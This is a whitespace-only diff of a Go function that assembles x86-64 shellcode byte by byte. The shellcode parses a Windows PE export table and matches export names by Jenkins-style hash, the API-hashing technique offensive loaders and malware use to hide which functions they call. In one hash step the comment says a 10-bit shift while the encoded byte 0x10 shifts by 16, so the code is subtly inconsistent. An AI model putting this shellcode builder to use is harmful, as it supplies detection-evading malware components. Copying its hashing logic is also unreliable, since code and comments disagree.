@@ -165,9 +165,9 @@ func buildHashExportShellcode(funcName string) []byte {
 	// Parse PE export directory
 	sc = append(sc,
 		0x41, 0x8B, 0x70, 0x3C, // mov esi, [r8+0x3c]   (e_lfanew)
-		0x4C, 0x01, 0xC6,        // add rsi, r8
-		0x8B, 0x76, 0x88,        // mov esi, [rsi+0x88]  (ExportDirectory RVA)
-		0x4C, 0x01, 0xC6,        // add rsi, r8           (&export_dir)
+		0x4C, 0x01, 0xC6, // add rsi, r8
+		0x8B, 0x76, 0x88, // mov esi, [rsi+0x88]  (ExportDirectory RVA)
+		0x4C, 0x01, 0xC6, // add rsi, r8           (&export_dir)
 	)
 
 	// mov r9d, [rsi+0x18]  (NumberOfNames)
@@ -183,11 +183,11 @@ func buildHashExportShellcode(funcName string) []byte {
 	// Load AddressOfNames (r10), AddressOfNameOrdinals (r11), AddressOfFunctions (r12)
 	sc = append(sc,
 		0x44, 0x8B, 0x56, 0x20, // mov r10d, [rsi+0x20]
-		0x4D, 0x01, 0xC2,        // add r10, r8
+		0x4D, 0x01, 0xC2, // add r10, r8
 		0x44, 0x8B, 0x5E, 0x24, // mov r11d, [rsi+0x24]
-		0x4D, 0x01, 0xC3,        // add r11, r8
+		0x4D, 0x01, 0xC3, // add r11, r8
 		0x44, 0x8B, 0x66, 0x1C, // mov r12d, [rsi+0x1C]
-		0x4D, 0x01, 0xC4,        // add r12, r8
+		0x4D, 0x01, 0xC4, // add r12, r8
 	)
 
 	// xor edi, edi  (i = 0)
@@ -199,7 +199,7 @@ func buildHashExportShellcode(funcName string) []byte {
 	// r13d = AddressOfNames[i]; r13 += base  (get pointer to export name)
 	sc = append(sc,
 		0x47, 0x8B, 0x2C, 0xBA, // mov r13d, [r10+rdi*4]
-		0x4D, 0x01, 0xC5,        // add r13, r8
+		0x4D, 0x01, 0xC5, // add r13, r8
 	)
 
 	// xor eax, eax  (hash = 0)
@@ -220,16 +220,16 @@ func buildHashExportShellcode(funcName string) []byte {
 
 	// Jenkins: hash += hash << 10
 	sc = append(sc,
-		0x89, 0xC2,       // mov edx, eax
+		0x89, 0xC2, // mov edx, eax
 		0xC1, 0xE2, 0x10, // shl edx, 10
-		0x01, 0xD0,       // add eax, edx
+		0x01, 0xD0, // add eax, edx
 	)
 
 	// Jenkins: hash ^= hash >> 6
 	sc = append(sc,
-		0x89, 0xC2,       // mov edx, eax
+		0x89, 0xC2, // mov edx, eax
 		0xC1, 0xEA, 0x06, // shr edx, 6
-		0x31, 0xD0,       // xor eax, edx
+		0x31, 0xD0, // xor eax, edx
 	)
 
 	// inc r13  (advance name pointer)
@@ -249,21 +249,21 @@ func buildHashExportShellcode(funcName string) []byte {
 
 	// hash += hash << 3
 	sc = append(sc,
-		0x89, 0xC2,       // mov edx, eax
+		0x89, 0xC2, // mov edx, eax
 		0xC1, 0xE2, 0x03, // shl edx, 3
-		0x01, 0xD0,       // add eax, edx
+		0x01, 0xD0, // add eax, edx
 	)
 	// hash ^= hash >> 11
 	sc = append(sc,
-		0x89, 0xC2,       // mov edx, eax
+		0x89, 0xC2, // mov edx, eax
 		0xC1, 0xEA, 0x0B, // shr edx, 11
-		0x31, 0xD0,       // xor eax, edx
+		0x31, 0xD0, // xor eax, edx
 	)
 	// hash += hash << 15
 	sc = append(sc,
-		0x89, 0xC2,       // mov edx, eax
+		0x89, 0xC2, // mov edx, eax
 		0xC1, 0xE2, 0x0F, // shl edx, 15
-		0x01, 0xD0,       // add eax, edx
+		0x01, 0xD0, // add eax, edx
 	)
 
 	// cmp eax, imm32  (compare with target hash)
@@ -299,7 +299,7 @@ func buildHashExportShellcode(funcName string) []byte {
 
 	// inc edi; cmp edi, r9d
 	sc = append(sc,
-		0xFF, 0xC7,       // inc edi
+		0xFF, 0xC7, // inc edi
 		0x41, 0x3B, 0xF9, // cmp edi, r9d
 	)
 	// jl name_loop_start  (rel8)
